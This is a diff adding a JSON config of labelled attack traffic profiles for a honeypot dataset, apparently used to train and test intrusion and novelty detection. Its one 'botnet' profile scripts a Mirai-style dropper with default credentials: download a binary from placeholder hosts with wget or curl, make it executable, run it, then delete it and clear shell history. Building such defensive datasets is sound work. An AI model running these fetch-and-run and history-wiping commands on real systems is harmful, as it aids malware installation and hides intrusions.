@@ -1,0 +1,116 @@
+{
+  "version": "2.2.0-compat",
+  "description": "Labelled traffic profiles for the honeypot dataset release. Each profile mirrors the style of configs/attack_profiles.json but adds a ground-truth category/label, randomised credentials, and optional steps so sessions are not near-duplicates. Steps: a command string, a list of alternatives (one is chosen), or {\"p\": probability, \"cmd\": ...} for an optional step. {placeholders} are filled from the pools below; held_out profiles are kept out of the DEC training set to test novelty detection. Compatibility revision 2.2.0 (2026-11-10): commands that block Cowrie's emulated shell were replaced or removed for botnet, data_exfiltration and lateral_movement; see reports/cowrie_profile_compatibility_v2/report.md. delay_range is ignored by generator 2.1.",
+  "placeholders": {
+    "ip": [
+      "192.0.2.10",
+      "198.51.100.20",
+      "203.0.113.30",
+      "192.0.2.40"
+    ],
+    "lan_ip": [
+      "192.0.2.5",
+      "192.0.2.12",
+      "198.51.100.10",
+      "203.0.113.8"
+    ],
+    "domain": [
+      "files.example",
+      "mirror.example",
+      "pkg-repo.example"
+    ],
+    "bin": [
+      "b.sh",
+      "malware.sh",
+      "update.sh",
+      "payload"
+    ],
+    "user": [
+      "support",
+      "sysbackup",
+      "ftpuser"
+    ],
+    "dir": [
+      "/tmp",
+      "/var/tmp",
+      "/dev/shm"
+    ]
+  },
+  "profiles": [
+    {
+      "name": "botnet",
+      "attack_cat": "botnet",
+      "label": 1,
+      "held_out": false,
+      "description": "Mirai-style dropper: fetch a file, make it executable, run it, clean up.",
+      "credentials": {
+        "usernames": [
+          "root",
+          "admin",
+          "support"
+        ],
+        "passwords": [
+          "admin",
+          "1234",
+          "support",
+          "default"
+        ],
+        "failed_attempts": [
+          0,
+          2
+        ]
+      },
+      "delay_range": [
+        0.1,
+        1.0
+      ],
+      "steps": [
+        [
+          "cd {dir}"
+        ],
+        [
+          "wget http://{domain}/{bin}",
+          "curl -O http://{domain}/{bin}"
+        ],
+        [
+          "chmod +x {bin}",
+          "chmod 777 {bin}"
+        ],
+        [
+          "./{bin}",
+          "sh {bin}"
+        ],
+        {
+          "p": 0.7,
+          "cmd": [
+            "rm -rf {bin}",
+            "rm {bin}"
+          ]
+        },
+        {
+          "p": 0.3,
+          "cmd": [
+            "history -c",
+            "unset HISTFILE"
+          ]
+        }
+      ],
+      "noise_pool": [
+        "enable",
+        "system",
+        "shell"
+      ],
+      "noise_count": [
+        0,
+        2
+      ],
+      "compat_notes": [
+        "wget target changed from {ip} to {domain}: in the isolated lab wget to an IP hangs Cowrie's shell; a DNS failure is handled and wget exits. Both download commands are still recorded; neither succeeds."
+      ]
+    }
+  ],
+  "derived_from": {
+    "file": "dataset_builder/profiles_v2_isolated.json",
+    "version": "2.1.0-docnet"
+  }
+}
